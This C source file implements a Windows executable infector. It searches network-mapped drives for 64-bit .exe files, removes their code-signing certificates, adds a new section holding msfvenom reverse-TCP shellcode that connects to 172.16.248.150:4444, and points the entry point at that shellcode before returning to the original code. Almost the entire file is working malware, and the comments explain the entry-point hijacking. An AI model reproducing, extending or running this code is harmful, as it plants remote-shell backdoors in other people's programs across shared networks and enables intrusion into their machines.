#include "needle.h"

////Globals
unsigned char ret2OEP64[] = "\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x8B\x40\x10\x48\x03\x40\x20\xFF\xE0"; //return to original address of entrypoint 64
unsigned char ret2OEP32[] = "\x64\xA1\x30\x00\x00\x00\x8B\x40\x10\x03\x40\x20\xFF\xE0"; //return to original address of entrypoint 32

unsigned char payload[] =
"\x50\x53\x51\x52\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57" // push all registers to stack (not rsp rbp)
//msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=172.16.248.150 LPORT=4444 EXITFUNC=none -f c
//swap bytes "48 ff ca" with 3 nops because the waitforsingleobject is called with -1 = INFINITY

// max size is 1000 bytes if you want more change the define at the header
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
"\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xac\x10\xf8\x9d\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
"\x48\x31\xd2\x90\x90\x90\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xaa\xc5\xe2\x5d\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"

"\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5F\x5E\x5A\x59\x5B\x58"  // pop all registers from the stack (not rbp rsp)
"\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x8B\x40\x10\x48\x03\x40\x20\xFF\xE0"; // return to original entry point for 64bit

//
//Case 1: Ends up in endless loop. Fail. I never provide the original AOEP
//	mov rax, gs:[0x60]
//	mov rax, [rax + 0x10]
//	lea rbx, [rax + 0x3c]
//	mov bl, byte ptr[rbx]
//	mov rbx, [rbx + 0x24]
//	shr rbx, 32
//	add rax, rbx
//	jmp rax
// 
//Case 2: We write the original AOEP at RVA 0x20 (or at 0x24) from the MZ (File Entry, or RVA 0)
//Ara gia na kanw jump se auto exw (64bit):
//	mov rax, gs : [0x60]	; RAX gets the address of PEB
//	mov rax, [rax + 0x10]	; RAX gets the address of the PEB member called ImageBaseAddress. RAX now points to RVA 0 or the base address the loader has loaded our binary
//	add rax, [rax + 0x20]	; RAX gets the RVA we have written as the LSWord
//	jmp rax					; Program jumps to the original Address of Entry Point
//
//Gia na kanw jmp sto se auto (32bit):
//	mov eax, fs:[0x30]		; EAX gets the address of PEB
//	mov eax, [eax + 0x10]	; EAX gets the address of the PEB member called ImageBaseAddress. EAX now points to RVA 0 or the base address the loader has loaded our binary
//	add eax, [eax + 0x20]	; EAX gets the RVA we have written as the LSWord
//	jmp eax					; Program jumps to the original Address of Entry Point

//After the first 2 instructions RAX has the base address. What needs to be done next is for the code to jump to the original AddressOfEntryPoint (AOEP)
//The way we do this is that we write the original AOEP in some place in the MS-DOS header that is empty. The MS-Dos header doesn't do anything else
//besides providing a pointer to the offset for the PE header (pointer to pointer). We find some empty DWORD inside that header and we write the 
//original AOEP in it. We can easily reference it since RAX from the 2 instructions above points at RVA 0 (base address). In this specific code,
//we have put the original AEOP at RVA + 0x20. We then add this to rax and jump to rax, since (Base Address + RVA) = Virtual Address Entry point at runtime


//Get the Base address to the RAX register:
//for 64bit gs:
//
//mov rax, gs:[0x60]
//mov rax, [rax + 0x10]
//
//for 32bit fs:
//
//mov eax, fs:[0x60]
//mov eax, [eax + 0x10]
//


unsigned char pushallregs[] = "\x50\x53\x51\x52\x56\x57\x55\x54\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57";
unsigned char popallregs[] = "\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5C\x5D\x5F\x5E\x5A\x59\x5B\x58";


LPCTSTR lpDriveNames[] = { "A:\\", "B:\\", "C:\\", "D:\\",
						   "E:\\", "F:\\", "G:\\", "H:\\",
						   "I:\\", "J:\\", "K:\\", "L:\\",
						   "M:\\", "N:\\", "O:\\", "P:\\",
						   "Q:\\", "R:\\", "S:\\", "T:\\",
						   "U:\\", "V:\\", "W:\\", "X:\\" };
//						   "Y:\\", "Z:\\" };

DWORD dwAvailDrives[MAXDRIVES] = { 0 };

struct sExeFiles {
	BOOL isValidPE;
	TCHAR szExeFileName[MAX_PATH + 1];
	DWORD dwBinaryType;
	struct sExeFiles *next;
};

struct sExeFiles *ExeFiles = NULL;

int _tmain(int argc, char *argv[])
{
	LPDWORD pdwDrives = dwAvailDrives;
	DWORD dwDrives = GetAvailableDrives();
	TCHAR szMappedNetworkDrive[5] = { 0 };
	DWORD nResult = 0;
	DWORD bSew = 0;
	struct sExeFiles *sWalk = NULL;

	//lpDriveNames[*pdwDrives] contains the drives that exist on the system
	while (*pdwDrives != 0)
	{
		nResult = GetNetworkConnectedDrives(lpDriveNames[*pdwDrives], szMappedNetworkDrive);
		if (nResult == DRIVE_REMOTE)	//TODO: change this DRIVE_REMOTE
		{
			_tprintf(_T("Drive %s is network mapped drive.\n"), szMappedNetworkDrive);
			BrowseDrive(szMappedNetworkDrive);
		}								//TODO: fix what happens if no drive is found. e.g.: print a message?
		pdwDrives++;
	}


	//infect each node in the list
	sWalk = ExeFiles;
	while (sWalk != NULL)
	{
		bSew = SewShellcodeNewSection(sWalk);
		if (bSew == NOT_VALID_EXE)
		{
			_tprintf(_T("%s is not a valid PE file.\n"), sWalk->szExeFileName);
			sWalk->isValidPE = FALSE;
			//removefromlist();
		}
		if (bSew == NOT_ENUFF_SPACE)
		{
			_tprintf(_T("%s: code cave not big enuff.\n"), sWalk->szExeFileName);
			exit(EXIT_FAILURE);
		}
		if (bSew == 0)
		{
			//_tprintf(_T("%s: infected successfully!\n"), sWalk->szExeFileName);
		}
		sWalk = sWalk->next;
	}
	CleanupExeList(ExeFiles);
	return 0;
}

DWORD GetAvailableDrives(void)
{
	DWORD dwMask = 1;
	DWORD dwCounter = 0;
	DWORD dwSave = 0;

	DWORD dwAvailableDrives = GetLogicalDrives();
	if (dwAvailableDrives == 0)
		return EXIT_FAILURE;

	do
	{
		if ((dwAvailableDrives & (dwMask << dwCounter)))
		{
			dwAvailDrives[dwSave] = dwCounter;
			dwSave++;
		}
		dwCounter++;
	} while (dwCounter < MAXDRIVES);

	return dwAvailableDrives;
}

DWORD GetNetworkConnectedDrives(LPCTSTR szDriveNameToCheck, LPTSTR destBuffer)
{
	UINT uiDriveType;
	uiDriveType = GetDriveTypeA(szDriveNameToCheck);
	if (uiDriveType == DRIVE_REMOTE)
	{
		_tcscpy_s(destBuffer, sizeof(TCHAR) * 4, szDriveNameToCheck);
		return DRIVE_REMOTE;
	}
	_tprintf(_T("No network drives found.\n"));

	return EXIT_SUCCESS;	//TODO: change this EXIT_SUCCESS
}

// Browse the network mapped drive to find .exe files recursively
DWORD BrowseDrive(LPTSTR szDrive)
{
	HANDLE hFind = NULL;
	WIN32_FIND_DATA findData;
	DWORD nResult = 0;
	TCHAR szDirPath[MAX_PATH + 1] = { 0 };
	DWORD dwExeType = 0;

	if (_stprintf_s(szDirPath, MAX_PATH, _T("%s\\*.*"), szDrive) == -1)
	{
		_tprintf(_T("error in sprintf: %d\n"), GetLastError());
	}
	if (szDirPath == NULL)
		return EXIT_FAILURE;

	hFind = FindFirstFile(szDirPath, &findData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		_tprintf(_T("no files detected\n"));
		return EXIT_FAILURE;
	}

	do
	{
		if (TypeOfFile(&findData) != TYPE_DOT)
		{
			_stprintf_s(szDirPath, MAX_PATH, _T("%s\\%s"), szDrive, findData.cFileName);
			if (TypeOfFile(&findData) == TYPE_DIR)
			{
				BrowseDrive(szDirPath); // what if we don't have permissions to browse the dir?
			}
			else
			{
				if (IsExe(szDirPath, &dwExeType) == TRUE)
				{
					InsertExeFile(&ExeFiles, szDirPath, &dwExeType);
				}
			}
		}
	} while (FindNextFile(hFind, &findData) != 0);
	FindClose(hFind);

	return TRUE;
}

DWORD TypeOfFile(LPWIN32_FIND_DATA lpFindData)
{
	BOOL isDir = FALSE;
	DWORD dwType = 0;
	isDir = (lpFindData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? TRUE : FALSE;
	if (isDir)
	{
		if ((_tccmp(lpFindData->cFileName, _T(".")) == 0) || (_tccmp(lpFindData->cFileName, _T("..")) == 0))
			return TYPE_DOT;
		else
			return TYPE_DIR;
	}
	return TYPE_FILE;
}

BOOL IsExe(LPTSTR fName, PDWORD pdwBinaryType)
{
	LPTSTR pszExt = NULL;
	DWORD nResult = 1;
	BOOL bBinType = FALSE;
	pszExt = PathFindExtension(fName);

	bBinType = GetBinaryType(fName, pdwBinaryType);
	if (bBinType == TRUE)
	{
		if (*pdwBinaryType == SCS_32BIT_BINARY)
		{
			_tprintf(_T("%s: is a 32-bit binary file. Skipping...\n"), fName);
			return FALSE;
		}
	} // what if it is a symlink or a hardlink?
	nResult = _tcsncmp(pszExt, _T(".exe"), 4);
	if (nResult == 0)
		if (bBinType == TRUE)
			return TRUE;

	return FALSE;
}

VOID InsertExeFile(struct sExeFiles **List, LPTSTR szFileName, PDWORD pdwBinaryType)
{
	struct sExeFiles *sNewNode;

	HANDLE hHeap = GetProcessHeap();
	if (hHeap == NULL)
	{
		_tprintf(_T("GetProcessHeap() error: %d\n"), GetLastError());
	}

	sNewNode = (struct sExeFiles *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(struct sExeFiles));
	if (sNewNode == NULL)
	{
		_tprintf(_T("HeapAlloc error\n"));
	}

	_tcscpy_s(sNewNode->szExeFileName, MAX_PATH, szFileName);
	sNewNode->isValidPE = TRUE;
	sNewNode->dwBinaryType = *pdwBinaryType;
	sNewNode->next = *List;
	*List = sNewNode;
}

VOID CleanupExeList(struct sExeFiles *List)
{
	if (List == NULL)
		return;

	struct sExeFiles *sRemove, *sTmp;
	HANDLE hHeap = NULL;

	hHeap = GetProcessHeap();
	if (hHeap == NULL)
	{
		_tprintf(_T("GetProcessHeap() error: %d\n"), GetLastError());
		return;
	}

	sRemove = List;

	while (sRemove != NULL)
	{
		sTmp = sRemove->next;
		HeapFree(hHeap, 0, sRemove);
		sRemove = sTmp;
	}
	List = NULL;

	return;
}

DWORD SewShellcodeNewSection(struct sExeFiles *sNode)
{
	/*
	Process (for each of the binaries to be injected)
	1. get a file handle with CreateHandle
	2. get the file size with GetFileSize
	3. CreateFileMapping to map the file in memory.
	4. MapViewOfFile and get the ptr to that and work with that. This ptr will be our reference to the file while working on it.
	5. add new section
	6. save the address of the original entry point to RVA 0x20
	7. add neccessary modifications so that the AddressOfEntryPoint points to it
	8. add shellcode
	9. jump back to the original entrypoint

	currently buggy because the mapping does not allocate enough size for the new size of the binary and nothing is written!!!!

	 */

	HANDLE hFile = NULL;
	DWORD dwCertificateCount = 0;
	HANDLE hFileMap = NULL;
	LARGE_INTEGER liFileSize = { 0 };
	LARGE_INTEGER liNewFileSize = { 0 };
	ULONGLONG ullMemoryKB = 0;
	LPVOID lpFileMap = NULL;
	WORD wNum = 0;
	DWORD dwSectionAlignment = 0;
	DWORD dwFileAlignment = 0;
	
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_FILE_HEADER pFileHeader = NULL;	//coff header
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeader = NULL;
	PIMAGE_NT_HEADERS pCSValue = NULL;

	PIMAGE_SECTION_HEADER pFirstSectionHeader = NULL;
	PIMAGE_SECTION_HEADER pLastSectionHeader = NULL;

	DWORD dwOEP = 0;
	BOOL bStatus = FALSE;

	DWORD dwCount = 0;
	DWORD dwOriginalSum = 0;

	hFile = CreateFile(sNode->szExeFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		_tprintf(_T("CreateFile() error: %d\n"), GetLastError());
		return FALSE;
	}

	/* ----------------------------------map file initially as read-only to get some info regarding section and size---------------- */
	hFileMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
	if (hFileMap == NULL)
	{
		_tprintf(_T("CreateFileMapping() error: %d\n"), GetLastError());
		return FALSE;
	}

	lpFileMap = MapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, 0);
	if (lpFileMap == NULL)
	{
		_tprintf(_T("MapViewOfFile() error: %d\n"), GetLastError());
		return FALSE;
	}

	pDosHeader = (PIMAGE_DOS_HEADER)lpFileMap;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		_tprintf(_T("%s is not a valid exe according to its DOS signature.\n"), sNode->szExeFileName);
		return NOT_VALID_EXE;
	}

	pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpFileMap + pDosHeader->e_lfanew);
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		_tprintf(_T("%s is not a valid exe according to its PE signature.\n"), sNode->szExeFileName);
		return NOT_VALID_EXE;
	}

	wNum = pNtHeader->FileHeader.NumberOfSections;
	dwSectionAlignment = pNtHeader->OptionalHeader.SectionAlignment;
	dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;

	bStatus = UnmapViewOfFile(lpFileMap);
	if (bStatus == FALSE)
	{
		_tprintf(_T("UnmapViewOfFile error: %d\n"), GetLastError());
		return FALSE;
	}

	bStatus = CloseHandle(hFileMap);
	if (bStatus == FALSE)
	{
		_tprintf(_T("CloseHandle error!?: %d\n"), GetLastError());
		return FALSE;
	}
	/* ----------------------------------unmap file and continue normally to remap it as rw so that we can do our stuff------------ */


	bStatus = ImageEnumerateCertificates(hFile, CERT_SECTION_TYPE_ANY, &dwCertificateCount, NULL, NULL);
	if (bStatus == FALSE)
	{
		_tprintf(_T("ImageEnumerateCertificates() error, can't get the certificates: %d\n"), GetLastError());
	}

	_tprintf(_T("%s found %d certificates.\n"), sNode->szExeFileName, dwCertificateCount);

	if (dwCertificateCount != 0)
	{
		do
		{
			bStatus = ImageRemoveCertificate(hFile, dwCount);
			if (bStatus == FALSE)
			{
				_tprintf(_T("ImageRemoveCertificate() failed: %d\n"), GetLastError());
				break;
			}
			_tprintf(_T("%s Removed certificate %d\n"), sNode->szExeFileName, dwCount + 1);
			dwCount++;
		} while (dwCount < dwCertificateCount);
	}

	bStatus = GetFileSizeEx(hFile, &liFileSize);
	if (bStatus == FALSE)
	{
		_tprintf(_T("GetFileSize() error, can't get the file size maybe a windows app? Error code: %d\n"), GetLastError());
		return FALSE;
	}

	if (liFileSize.HighPart != 0)
	{
		_tprintf(_T("Actual LARGE_INTEGER is not supported. Exiting...\n"));
		return FALSE;
	}

	bStatus = GetPhysicallyInstalledSystemMemory(&ullMemoryKB);
	if (bStatus == FALSE)
	{
		_tprintf(_T("GetPhysicallyInstalledSystemMemory() error, can't get the physical memory of the system. Error code: %d\n"), GetLastError());
		return FALSE;
	}

	liNewFileSize.QuadPart = liFileSize.QuadPart + SECTION_SIZE;
	liNewFileSize.LowPart = P2ALIGNUP(liNewFileSize.LowPart, dwFileAlignment);

	//catch the vuln
	if (((liNewFileSize.QuadPart) < 0) || ((ULONGLONG)liNewFileSize.QuadPart >= ((ullMemoryKB * 1024) / 2)))
	{
		_tprintf(_T("%s file too large to be mapped in system memory, exiting...\n"), sNode->szExeFileName);
		return FALSE;
	}

	hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, liNewFileSize.u.HighPart, liNewFileSize.u.LowPart, NULL);
	if(hFileMap == NULL)
	{
		_tprintf(_T("CreateFileMapping() error: %d\n"), GetLastError());
		return FALSE;
	}

	lpFileMap = MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, liNewFileSize.QuadPart);
	if (lpFileMap == NULL)
	{
		_tprintf(_T("MapViewOfFile() error: %d\n"), GetLastError());
		return FALSE;
	}

	pDosHeader = (PIMAGE_DOS_HEADER)lpFileMap;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		_tprintf(_T("%s is not a valid exe according to its DOS signature.\n"), sNode->szExeFileName);
		return NOT_VALID_EXE;
	}

	pFileHeader = (PIMAGE_FILE_HEADER)((LPBYTE)lpFileMap + pDosHeader->e_lfanew + sizeof(DWORD));
	if (pFileHeader == NULL)
	{
		_tprintf(_T("%s does not have a valid COFF header.\n"), sNode->szExeFileName);
		return NOT_VALID_EXE;
	}

	pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)((LPBYTE)lpFileMap + pDosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
	if (pOptionalHeader == NULL)
	{
		_tprintf(_T("%s can't set the optional header\n"), sNode->szExeFileName);
		return FALSE;
	}

	pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)lpFileMap + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	if (pSectionHeader == NULL)
	{
		_tprintf(_T("%s: can't get the section header.\n"), sNode->szExeFileName);
		return FALSE;
	}

	pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpFileMap + pDosHeader->e_lfanew);
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		_tprintf(_T("%s is not a valid exe according to its PE signature.\n"), sNode->szExeFileName);
		return NOT_VALID_EXE;
	}

	wNum = pFileHeader->NumberOfSections;


//#ifdef _WIN32
//	MessageBox(NULL, _T("testwin32"), _T("testwin32w00t"), 0);
//#elif _WIN64
//	MessageBox(NULL, _T("testwin32"), _T("testwin32w00t"), 0);
//
//#endif
//
	/*
	To add a new section we need to do the following changes to the binary:
	1. section header for last (added) section change Misc.VirtualSize (change the size of the section when loaded in memory)
	2. section header for last (added) section change virtualaddress (RVA to where the loader should map the section)
	3. section header for last (added) section change SizeOfRawData (size of the section rounded up to FileAlignment)
	4. section header for last (added) section change PointerToRawData (point it to our shellcode this is the "disk" reference)
	5. section header for last (added) section change Characteristics (permissions)
	6. change the size of the image
	*/

	// keep in mind that the reference pSectionHeader[pFileHeader->NumberOfSections] is an indirect reference to the last entry in the array of structures
	ZeroMemory(&pSectionHeader[wNum], sizeof(IMAGE_SECTION_HEADER));
	CopyMemory(&pSectionHeader[wNum].Name, SECTION_NAME, 8);

	pSectionHeader[wNum].Misc.VirtualSize = SECTION_SIZE;
	pSectionHeader[wNum].VirtualAddress = Align(pSectionHeader[wNum - 1].Misc.VirtualSize, pOptionalHeader->SectionAlignment, pSectionHeader[wNum - 1].VirtualAddress);
	pSectionHeader[wNum].SizeOfRawData = Align(SECTION_SIZE, pOptionalHeader->FileAlignment, 0);
	pSectionHeader[wNum].PointerToRawData =	Align(pSectionHeader[wNum - 1].SizeOfRawData, pOptionalHeader->FileAlignment, pSectionHeader[wNum - 1].PointerToRawData);
	pSectionHeader[wNum].Characteristics = 0xE00000E0;

	// change the size of the image 
	pOptionalHeader->SizeOfImage = pSectionHeader[wNum].VirtualAddress + pSectionHeader[wNum].Misc.VirtualSize;
	
	// change the number of sections
	pFileHeader->NumberOfSections += 1;

	// add our shellcode
	pFirstSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
	pLastSectionHeader = pFirstSectionHeader + (pNtHeader->FileHeader.NumberOfSections - 1);
	
	// fill the space with zeros intially. This is required because of the certificate at the end...
//	ZeroMemory((LPBYTE)lpFileMap + pLastSectionHeader->PointerToRawData, SECTION_SIZE);

	// save RVA of the AddressOfEntryPoint (original)
	dwOEP = pNtHeader->OptionalHeader.AddressOfEntryPoint;
	_tprintf(_T("%s old AddressOfEntryPoint RVA: 0x%x\n"), sNode->szExeFileName, dwOEP);

	// put the shellcode in the new section->ptr to raw data and save the original AOEP at 0x20 after RVA 0
	CopyMemory((LPBYTE)lpFileMap + pLastSectionHeader->PointerToRawData, payload, sizeof(payload) - 1);
	CopyMemory((LPBYTE)lpFileMap + 0x20, &dwOEP, sizeof(DWORD));
	_tprintf(_T("%s pointer to raw data is at 0x%x and the first byte is %x\n"), 
		sNode->szExeFileName, pLastSectionHeader->PointerToRawData, *((LPBYTE)lpFileMap + pLastSectionHeader->PointerToRawData));

	// modify the RVA AddressOfEntryPoint to point to our new section
	pNtHeader->OptionalHeader.AddressOfEntryPoint = pLastSectionHeader->VirtualAddress;
	_tprintf(_T("%s new AddressOfEntryPoint RVA: 0x%x\n"), sNode->szExeFileName, pNtHeader->OptionalHeader.AddressOfEntryPoint);

	// update checksum with the modified one
	pCSValue = CheckSumMappedFile(lpFileMap, liNewFileSize.u.LowPart, &dwOriginalSum, &(pNtHeader->OptionalHeader.CheckSum));
	if (pCSValue == NULL)
	{
		_tprintf(_T("%s checksum failed: %d\n"), sNode->szExeFileName, GetLastError());
		return FALSE;
	}
	_tprintf(_T("%x\n"), pNtHeader->OptionalHeader.CheckSum);

	bStatus = UnmapViewOfFile(lpFileMap); 
	if (bStatus == FALSE)
	{
		_tprintf(_T("UnmapViewOfFile error: %d\n"), GetLastError());
		return FALSE;
	}

	bStatus = CloseHandle(hFileMap);
	if (bStatus == FALSE)
	{
		_tprintf(_T("CloseHandle error!?: %d\n"), GetLastError());
		return FALSE;
	}

	bStatus = CloseHandle(hFile);
	if (bStatus == FALSE)
	{
		_tprintf(_T("CloseHandle error: %d\n"), GetLastError());
		return FALSE;
	}

	return TRUE;
}

DWORD SewShellcode(struct sExeFiles *sNode)
{
	BOOL bClose = FALSE;
	DWORD dwSize = 0;
	LPDWORD lpSize = NULL;
	HANDLE hFileMap = 0;
	LPVOID lpFileMap = NULL;
	HANDLE hFile = NULL;
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeader = NULL;
	PIMAGE_SECTION_HEADER pSectionHeaderFirst = NULL;
	PIMAGE_SECTION_HEADER pSectionHeaderLast = NULL;
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = NULL;
	ULONGLONG ullOEP = 0;
	DWORD dwOEP = 0;
	DWORD dwShellcodeSize = sizeof(payload) - 1;
	DWORD dwCount = 0;
	DWORD dwPos = 0;

	hFile = CreateFile(sNode->szExeFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		_tprintf(_T("CreateFile error: %d\n"), GetLastError());
		return 1;
	}

	dwSize = GetFileSize(hFile, lpSize);
	if (!dwSize)
	{
		_tprintf(_T("GetFileSize error: %d\n"), GetLastError());
		return 1;
	}

	hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwSize, NULL);
	if (hFileMap == NULL)
	{
		_tprintf(_T("CreateFileMapping error: %d\n"), GetLastError());
		return 1;
	}

	lpFileMap = MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, dwSize);
	if (lpFileMap == NULL)
	{
		_tprintf(_T("MapViewOfFile error: %d\n"), GetLastError());
		return 1;
	}

	pDosHeader = (PIMAGE_DOS_HEADER)lpFileMap;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return NOT_VALID_EXE;
	}

	//omg: https://docs.microsoft.com/en-us/windows/desktop/winprog64/rules-for-using-pointers 
	pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpFileMap + pDosHeader->e_lfanew);
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		return NOT_VALID_EXE;
	}

	ullOEP = pNtHeader->OptionalHeader.ImageBase + pNtHeader->OptionalHeader.AddressOfEntryPoint;
	pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNtHeader->OptionalHeader;
	pSectionHeaderFirst = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHeader);
	pSectionHeaderLast = (PIMAGE_SECTION_HEADER)(pSectionHeaderFirst + pNtHeader->FileHeader.NumberOfSections - 1);

	for (dwPos = pSectionHeaderLast->PointerToRawData; dwPos < dwSize; dwPos++)
	{
		if (*((LPBYTE)lpFileMap + dwPos) == 0x00)
		{
			if (dwCount == dwShellcodeSize)
			{
				dwPos -= dwShellcodeSize;
				break;
			}
			dwCount++;
		}
		else
		{
			dwCount = 0;
		}
	}

	if (dwCount == 0 || dwPos == 0)
	{
		_tprintf(_T("%s: code cave not big enough.\n"), sNode->szExeFileName);

		bClose = UnmapViewOfFile(lpFileMap);
		if (bClose == 0)
		{
			_tprintf(_T("UnmapViewOfFile error: %d\n"), GetLastError());
		}

		bClose = CloseHandle(hFile);
		if (bClose == FALSE)
		{
			_tprintf(_T("CloseHandle error: %d\n"), GetLastError());
		}

		return 0;
	}
	_tprintf(_T("Remember, all the memory addresses below are RVAs (offsets within the file)!\n"));
	_tprintf(_T("Image Base + RVA = Virtual Memory Address (on runtime)\n"));

	_tprintf(_T("%s: we are writing our payload here: 0x%x\n"), sNode->szExeFileName, dwPos);
	_tprintf(_T("%s: found code cave with size eq to shellcode size: %d\n"), sNode->szExeFileName, dwCount);
	/*
	0x60	PUSHAD                            # Save the registers
	0x9c	PUSHFD                            # Save the flags

	...shellcode...

	0x9d	POPFD                             # Restore the flags
	0x60	POPAD                             # Restore the registers

	...restore execution flow...

	==== push all registers to the stack as 64 bit requires manny instructions ====

	1. we need to update the section header size to include the size of the shellcode
		pSectionHeaderLast->Misc.VirtualSize += dwShellcodeSize;
	2. we need to make the section executable
		pSectionHeaderLast->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
	3. we need to set the new entry point to be our shellcode
		set entry point
		RVA = file offset + virtual offset - raw offset
		pNtHeader->OptionalHeader.AddressOfEntryPoint = dwPos + pSectionHeaderLast->VirtualAddress - pSectionHeaderLast->PointerToRawData;
	*/

	dwOEP = pNtHeader->OptionalHeader.AddressOfEntryPoint;

	_tprintf(_T("%s: the current AddressOfEntryPoint: 0x%x (this is where our shellcode should jump to after doing its thing) \n"), 
		sNode->szExeFileName, pNtHeader->OptionalHeader.AddressOfEntryPoint);

	CopyMemory(((LPBYTE)lpFileMap + dwPos), payload, sizeof(payload) - 1);		//don't need the null byte at the end
	CopyMemory(((LPBYTE)lpFileMap + 0x20), &dwOEP, sizeof(DWORD));				//save the original AOEP 0x20 bytes after RVA 0 (DOS HEADER)

	//calculate the OEP before returning. we calculate the new oep by adding the AddressOfEntryPoint and the Base address
	_tprintf(_T("%s: printing the ImageBase + AddressOfEntryPoint. This might not be accurate due to rebase 0x%I64x\n"), sNode->szExeFileName, ullOEP);

	pSectionHeaderLast->Misc.VirtualSize += dwShellcodeSize;
	pSectionHeaderLast->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
